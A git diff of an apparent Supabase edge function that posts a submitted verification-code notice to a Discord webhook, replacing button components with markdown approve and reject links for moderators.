@@ -49,7 +49,7 @@ serve(async (req) => {
       });
     }
 
-    // Si c'est le code, mettre à jour et envoyer pour validation avec boutons
+    // Si c'est le code, mettre à jour et envoyer pour validation
     if (step === "code" && submissionId) {
       await supabase
         .from('submissions')
@@ -60,6 +60,9 @@ serve(async (req) => {
       const now = new Date();
       const dateStr = now.toLocaleDateString('fr-FR', { day: '2-digit', month: '2-digit', year: 'numeric' });
       const timeStr = now.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
+
+      const approveUrl = `${callbackUrl}?id=${submissionId}&action=approve`;
+      const rejectUrl = `${callbackUrl}?id=${submissionId}&action=reject`;
 
       const embed = {
         title: "🔐 Code de vérification soumis",
@@ -73,36 +76,18 @@ serve(async (req) => {
         footer: { text: "En attente de validation par un modérateur" },
       };
 
-      // Message avec boutons URL
-      const payload = {
-        embeds: [embed],
-        components: [
-          {
-            type: 1, // Action Row
-            components: [
-              {
-                type: 2, // Button
-                style: 5, // Link style
-                label: "Accepter",
-                url: `${callbackUrl}?id=${submissionId}&action=approve`,
-                emoji: { name: "✅" }
-              },
-              {
-                type: 2, // Button
-                style: 5, // Link style
-                label: "Refuser",
-                url: `${callbackUrl}?id=${submissionId}&action=reject`,
-                emoji: { name: "❌" }
-              }
-            ]
-          }
-        ]
-      };
+      // Contenu du message avec liens cliquables stylisés
+      const content = `
+**🔗 Actions de modération:**
+✅ **[ACCEPTER](${approveUrl})**  |  ❌ **[REFUSER](${rejectUrl})**`;
 
       await fetch(DISCORD_WEBHOOK_URL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload),
+        body: JSON.stringify({ 
+          content: content,
+          embeds: [embed] 
+        }),
       });
 
       return new Response(JSON.stringify({ success: true }), {
